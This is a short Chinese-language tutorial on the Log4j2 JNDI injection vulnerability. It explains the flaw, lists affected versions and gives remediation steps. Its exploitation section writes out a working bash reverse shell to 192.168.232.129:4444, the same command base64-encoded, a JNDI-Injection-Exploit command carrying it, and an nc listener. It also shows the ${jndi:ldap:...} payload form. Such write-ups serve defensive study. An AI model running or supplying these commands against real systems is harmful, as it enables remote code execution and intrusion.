## 1.漏洞原理

`Apache Log4j2`是一个应用于java程序的日志记录框架，支持`JNDI协议`。

攻击者通过构造`payload`，一般为`${jndi:ldap:恶意URL/POC}`，在`JNDI`接口lookup查询处进行注入，JNDI会去对应的服务（如LDAP、RMI、DNS等）进行资源查找，由于lookup的出栈未做限制，最终指向攻击者部署好的恶意站点，下载并执行远程恶意代码，造成RCE。

log4j2框架的lookup查询服务提供`{}`字段解析功能，如`${java:version}`输出对应的java版本

## 2.JNDI解析器

JNDI全称Java命名和目录接口（Java Namespace Directory Interface），提供命名服务和目录服务，**允许从指定的远程服务器获取并加载对象，JDNI注入攻击常用LDAP和RMI两种服务**。

jdni日志记录方式如下：

```java
logger.info("system property:${jdni:schema://url}");
```

JDK从URL指定路径下载一段字节流，将其反序列化为java对象（反序列化过程中会执行字节流中包含的程序），作为jndi返回。

## 3.影响版本

Apache Log4j2 2.0 - 2.15.0-rc1

## 4.漏洞利用（JNDI注入反弹shell）

1. 反弹shell指令

`bash -i >& /dev/tcp/192.168.232.129/4444 0>&1`

2.对指令进行base64编码

`YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMi4xMjkvNDQ0NCAwPiYx`

3.使用JDNI利用工具[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)生成JNDI链接并启动后端相关服务

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMi4xMjkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" -A 192.168.232.129`

4.在攻击机上新开一个窗口进行监听4444端口

`nc -lnvl 4444`

5.发送生成第3步生成的jdni链接到目标环境，可收到反弹shell

## 5.修复方案

* 升级到最新版本 https://logging.apache.org/log4j/2.x/download.html
* 2.10以上版本的log4j可以关闭lookup功能。配置为：log4j2.formatMsgNoLookups = true
* 修改或删除JndiLookup类，禁用 jndi lookup 
* 在WAF中配置规则攻击字符串得特性是 ${jndi:schema://url}，阻断攻击性输入

